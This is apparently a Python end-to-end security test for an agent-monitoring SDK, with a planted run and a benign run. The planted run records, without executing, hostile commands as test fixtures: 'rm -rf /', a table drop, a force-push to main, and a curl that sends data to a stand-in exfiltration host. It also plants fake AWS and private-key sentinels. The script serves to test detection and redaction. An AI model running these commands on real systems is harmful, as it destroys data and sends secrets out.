"""Records the two SDK runs of scripts/security-e2e.sh through the REAL Python SDK and its coding helpers.

    uv run --project packages/sdk-python python scripts/security_e2e_plant.py planted|benign

Needs BLACKBOX_API_KEY (events:write + artifacts:write), BLACKBOX_ENDPOINT and, for `planted`, a JSON file (second argument)
with "plant" (a unique tag), "aws" and "pem_body" (the secret sentinels). They are NOT passed through the environment: the
coding helpers mask the host's environment values by value, which would hide them before the server ever saw them.
Prints one JSON line with the run id.

`planted`: an agent that reads a `.env`, prints an AWS-style key and a private key (in a command, its output and a file
diff), force-pushes `main`, drops a table, wipes a disk and calls a host that is not on the project's allowlist.
Commands that would do harm are RECORDED (a span with the classifier's verdict), never executed; the harmless ones
(`python -c print(...)`, `ls`) really run. The SDK redacts what it can before anything leaves the process; the findings
come from the markers it leaves and from what the server sees.

`benign`: an ordinary coding run (files, tests, git, an allowed host, `rm -rf node_modules`): it must produce no
security finding at all (Phase 13 gate 4).
"""

import json
import os
import subprocess
import sys
import tempfile
from pathlib import Path

from agent_blackbox import BlackBox, PayloadMode
from agent_blackbox.coding import CodingRecorder


def pem(body: str) -> str:
    return f"-----BEGIN RSA PRIVATE KEY-----\n{body}\n-----END RSA PRIVATE KEY-----"


def record_only(bb: BlackBox, run, rec: CodingRecorder, command: str, exit_code: int = 0) -> None:  # type: ignore[no-untyped-def]
    """A shell span with the classifier's verdict, without running anything."""
    verdict = rec.classify(command)
    span = run.span(
        rec.sanitize(command),
        kind="shell",
        attributes={
            "shell.cwd": "/workspace",
            "shell.risk_class": verdict.risk_class,
            "shell.category": verdict.category,
        },
    )
    span.start()
    span.set_attributes({"shell.exit_code": exit_code, "shell.duration_ms": 12.0})
    span.end("success" if exit_code == 0 else "error")


def git(root: Path, *args: str) -> None:
    subprocess.run(["git", *args], cwd=root, check=True, capture_output=True)  # noqa: S603, S607


def workspace(dest: Path, plant: str) -> Path:
    root = dest / "repo"
    (root / "src").mkdir(parents=True)
    (root / "tests").mkdir()
    (root / "src" / "app.py").write_text("def greet(name):\n    return 'hello ' + name\n")
    (root / "tests" / "test_app.py").write_text(
        "from src.app import greet\n\n\ndef test_greet():\n    assert greet('a') == 'hello a'\n"
    )
    (root / "README.md").write_text("# demo\n\nA small project.\n")
    deploy = root / f"deploy-{plant}"
    deploy.mkdir()
    # An unrelated value: the helpers mask a secret file's values everywhere, and the plant tag must stay visible.
    (deploy / ".env").write_text("DB_PASSWORD=unrelated-dummy-value-73\n")
    git(root, "init", "-q")
    git(root, "config", "user.email", "agent@example.test")
    git(root, "config", "user.name", "agent")
    git(root, "add", "-A")
    git(root, "commit", "-q", "-m", "initial")
    return root


def planted(bb: BlackBox, root: Path, values: dict[str, str]) -> str:
    plant, aws, body = values["plant"], values["aws"], values["pem_body"]
    with bb.run("Security E2E: planted run") as run:
        rec = CodingRecorder(bb, run, root)
        rec.run_command("python --version")  # ordinary activity around the planted events
        rec.read_file("src/app.py")
        # 1. secret file read (a path with the plant tag in it)
        rec.read_file(f"deploy-{plant}/.env")
        # 2. credentials in a command, its output and a diff; the SDK redacts all three
        rec.run_command(f"python -c \"print('AWS_ACCESS_KEY_ID={aws}')\"")
        rec.run_command(f"printf '%s' '{pem(body)}' > /dev/null")
        rec.write_file(f"notes-{plant}/deploy.txt", f"key={aws}\n{pem(body)}\n")
        # 3. recorded, never executed
        record_only(bb, run, rec, f"rm -rf / # {plant}", 1)  # destructive
        record_only(bb, run, rec, f"psql -c 'DROP TABLE users_{plant}'", 127)  # privileged db
        record_only(bb, run, rec, f"git push --force origin main # {plant}", 128)  # risky git
        record_only(bb, run, rec, "curl -s https://api.example.com/health")  # on the allowlist
        record_only(
            bb, run, rec, f"curl -s https://exfil-{plant}.example.net/collect?k={plant}"
        )  # not on it
        rec.run_command("ls")
        run_id = run.run_id
    bb.shutdown(20)
    return run_id


def benign(bb: BlackBox, root: Path) -> str:
    with bb.run("Security E2E: ordinary coding run") as run:
        rec = CodingRecorder(bb, run, root)
        rec.run_command("ls -la")
        rec.run_command("git status")
        rec.read_file("README.md")
        rec.read_file("src/app.py")
        rec.run_command("grep -rn greet src tests")
        rec.write_file("src/app.py", "def greet(name):\n    return f'hello {name}'\n")
        rec.write_file("src/util.py", "def double(x):\n    return x * 2\n")
        rec.run_command("python -c 'print(sum(range(10)))'")
        rec.run_command("python -m pytest -q")
        rec.run_command("git diff")
        rec.run_command("git add -A")
        rec.run_command("git commit -q -m 'fix: friendlier greeting'")
        # recorded only: ordinary developer commands the detectors must not flag
        for command in (
            "npm install",
            "npm test",
            "pip install -r requirements.txt",
            "rm -rf node_modules",
            "rm build.log",
            "git reset --hard",
            "git push origin feature/friendlier-greeting",
            "git checkout -b feature/friendlier-greeting",
            "cat .env.example",
            "ls .env",
            "docker compose up -d",
            "curl -s http://localhost:8000/healthz",
            "curl -s https://api.example.com/v1/items",
            'psql -c "SELECT id, name FROM users WHERE id = 1"',
            'psql -c "DELETE FROM sessions WHERE expires_at < now()"',
            "make build",
            "chmod +x scripts/run.sh",
            "mkdir -p build/out",
        ):
            record_only(bb, run, rec, command)
        run_id = run.run_id
    bb.shutdown(20)
    return run_id


def main() -> int:
    kind = sys.argv[1]
    # `python` in recorded commands must be the interpreter running this script.
    os.environ["PATH"] = str(Path(sys.executable).parent) + os.pathsep + os.environ.get("PATH", "")
    bb = BlackBox(
        project="security-e2e", agent_id="coding-agent", mode="http", payload_mode=PayloadMode.FULL
    )
    values: dict[str, str] = json.loads(Path(sys.argv[2]).read_text()) if len(sys.argv) > 2 else {}
    with tempfile.TemporaryDirectory(prefix="abb-security-e2e-") as scratch:
        root = workspace(Path(scratch), values.get("plant", "benign"))
        run_id = planted(bb, root, values) if kind == "planted" else benign(bb, root)
    print(json.dumps({"run_id": run_id, "stats": bb.stats()}))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
